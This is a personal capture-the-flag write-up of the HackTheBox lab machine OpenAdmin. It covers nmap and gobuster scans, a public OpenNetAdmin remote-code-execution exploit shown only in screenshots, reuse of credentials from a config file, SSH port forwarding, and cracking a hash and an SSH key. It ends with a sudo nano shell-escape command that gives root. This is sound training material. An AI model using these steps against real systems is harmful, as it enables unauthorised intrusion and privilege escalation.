---
layout: default
title : muzec - OpenAdmin Writeup
---

![image](https://user-images.githubusercontent.com/69868171/125621019-4f014d19-1a2e-43e1-87b6-9cee5f35bb6e.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Wed Jul 14 08:01:37 2021 as: nmap -sC -sV -oA nmap 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.40s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 14 08:02:55 2021 -- 1 IP address (1 host up) scanned in 78.33 seconds
```

Linux my food lol so we are working on OpenAdmin On HackTheBox we always kick off with Nmap scan now that we have our result let start enumerating seems we have 2 open ports.

![image](https://user-images.githubusercontent.com/69868171/125621350-ad1680bd-05a3-4e92-89e1-92dee5b063ff.png)

Ok that a default apache page now let hit `gobuster` to find some hidden directory.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/retired/10.10.10.171]
└─$ gobuster dir -u http://10.10.10.171 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,bak,sh,pl,cgi,zip
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.171
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              bak,sh,pl,cgi,zip,txt,php,html
[+] Timeout:                 10s
===============================================================
2021/07/14 10:24:24 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
```

Music directory cool let navigate to it.

![image](https://user-images.githubusercontent.com/69868171/125621953-9f49b763-bebb-4fb7-906a-4ef069c2d04f.png)

Going through the pages clicking on `login` land me on a new page.

![image](https://user-images.githubusercontent.com/69868171/125622083-5da5d1f6-235f-46c8-be23-535778b9b299.png)

Seems it running `OpenNetAdmin v18.1.1` let do a quick google search maybe it vulnerable.

![image](https://user-images.githubusercontent.com/69868171/125622278-e80b5950-a86f-46b3-8a9e-4d02b522ced3.png)

![image](https://user-images.githubusercontent.com/69868171/125622336-41298a5b-e035-4264-b0e5-f97930a206c9.png)

Remote Code Execution  exploit let try it.

![image](https://user-images.githubusercontent.com/69868171/125622486-4d334f1d-1243-4734-9442-d9b1d05cb323.png)

We have shell cool.

![image](https://user-images.githubusercontent.com/69868171/125624083-155a81de-0780-4387-85f8-429d92409329.png)

Some users on the home directory but have no permission seems we need to move our privilege. Going through directories `/var/www/ona/local/config` i was able to get a credentials in a config file.

![image](https://user-images.githubusercontent.com/69868171/125624643-6bb4c25d-bd5c-46ea-b495-6972cd5d3009.png)

Now let SSH with user `jimmy` with the password.

![image](https://user-images.githubusercontent.com/69868171/125624857-6d5b23ee-1fe4-44f5-8e9e-f872adc4a095.png)

We are in i always love checking what ports we have ruuning locally with `netstat -tulpn` .

![image](https://user-images.githubusercontent.com/69868171/125625148-65457c60-8589-487e-bdab-285868a4e36f.png)


### SSH Port Forwarding

```
 ssh -L 52846:localhost:52846 jimmy@10.10.10.171
 ```
 
![image](https://user-images.githubusercontent.com/69868171/125625594-43420b73-92b9-4a99-8241-647647660aac.png)


Now let access it on our browser.

![image](https://user-images.githubusercontent.com/69868171/125625726-f1001f42-a87e-414e-919c-c9d56dee3d6e.png)

Seems we need a credentials i try using `Jimmy` creds but no luck now back to enumerate more.

![image](https://user-images.githubusercontent.com/69868171/125626115-44e8cc90-94a5-4f78-a3c8-354122e7175c.png)

Username and a hash let try cracking it using online tools.

![image](https://user-images.githubusercontent.com/69868171/125626320-607207f0-4f08-44c1-aed8-8998212ae62e.png)

Now let log in.

![image](https://user-images.githubusercontent.com/69868171/125626395-3b542e65-acab-4b66-8801-4610969c4590.png)

Boom we have `joanna` SSH private key. Let crack it and hit SSH.

![image](https://user-images.githubusercontent.com/69868171/125626949-33c1de5c-b537-4713-a58e-81880ce14f8e.png)

Now let SSH into the machine with the Private Key and the password we got from it.

![image](https://user-images.githubusercontent.com/69868171/125627303-907e3d17-6b41-4abe-979d-b4afad1f6582.png)

We are in and can run sudo on `/bin/nano /opt/priv` .

### ROOT

```
sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
```

![image](https://user-images.githubusercontent.com/69868171/125628251-7cac9f03-0d45-4ba7-b56d-a49c3c05c678.png)


We are root and Done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
